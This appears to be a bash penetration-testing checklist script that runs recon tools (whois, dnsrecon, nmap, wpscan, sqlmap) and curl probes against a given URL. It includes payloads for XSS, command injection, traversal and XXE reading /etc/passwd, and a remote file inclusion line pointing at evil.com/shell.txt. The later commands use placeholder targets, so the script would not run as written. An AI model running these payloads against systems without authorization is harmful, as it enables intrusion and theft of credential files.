# Note: Perform these tests only on websites and web platforms for which you have explicit authorization. Unauthorized testing is illegal and unethical.
# Note: Most of these tools are available in Kali Linux.

#!/bin/bash

# Function to validate URL format
validate_url() {
    if [[ ! $1 =~ ^(http|https):// ]]; then
        echo "Error: The provided parameter is not a valid URL. It should start with http:// or https://."
        exit 1
    fi
}


# Check if the required tools are installed
required_tools=(whois dnsrecon whatweb nc wpscan sqlmap curl nmap sslscan nrich dig)
for tool in "${required_tools[@]}"; do
    if ! command -v $tool &> /dev/null; then
        echo "$tool is not installed. Please install it before running the script."
        exit 1
    fi
done

# Check if a URL parameter is provided
if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <url>"
    exit 1
fi

# Get the URL from the first argument
url="$1"

# Validate the URL format
validate_url "$url"

# Extract host and domain
host=$(echo "$url" | awk -F[/:] '{print $4}')
domain=$(echo "$host" | awk -F. '{if (NF>2) {print $(NF-1)"."$NF} else {print $0}}')
# Get the first IPv4 address from DNS
ipv4=$(dig +short "$host" | tail -n1)

echo
echo Host=$host
echo Domain=$domain
echo IPv4=$ipv4
echo Url=$url
echo


# WHOIS lookup for domain information
whois <domain>

# DNS reconnaissance
dnsrecon -d <domain>

# Identify technologies used on the website
whatweb <url>

# Check MSSQL, MySQL or MariaDB database version
nmap -p 1433,3306 --script ms-sql-info,mysql-info <host>

# Wordpress vulnerability scan
wpscan --stealthy --url <url>

# SQL Injection test
sqlmap -u <url> --batch --dbs

# XSS test
curl -s -o /dev/null -w "%{http_code}" -d "<script>alert(1)</script>" <url>

# CSRF test
curl -s -o /dev/null -w "%{http_code}" -X POST -d "param=value" <url>

# Directory traversal test
curl -s -o /dev/null -w "%{http_code}" <url>/../../etc/passwd

# Command injection test
curl -s -o /dev/null -w "%{http_code}" <url>?cmd=ls

# Host header injection test
curl -s -o /dev/null -w "%{http_code}" -H "Host: malicious.example.com" <url>

# Path traversal test
curl -s -o /dev/null -w "%{http_code}" <url>/../../../../etc/passwd

# Local File Inclusion (LFI) test
curl -s -o /dev/null -w "%{http_code}" <url>?file=../../../../etc/passwd

# Remote File Inclusion (RFI) test
curl -s -o /dev/null -w "%{http_code}" <url>?file=http://evil.com/shell.txt

# XML External Entity (XXE) test
curl -s -o /dev/null -w "%{http_code}" -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>' <url>

# SSL/TLS scan
sslscan <url | host>

# Basic Nmap scan
sudo nmap <host>

# Comprehensive Nmap scan with vulnerability scripts
sudo nmap -sV -sC --script vuln* -O -p <port1,port2,...> <host>

# Shodan scan
echo <IPv4> | nrich -





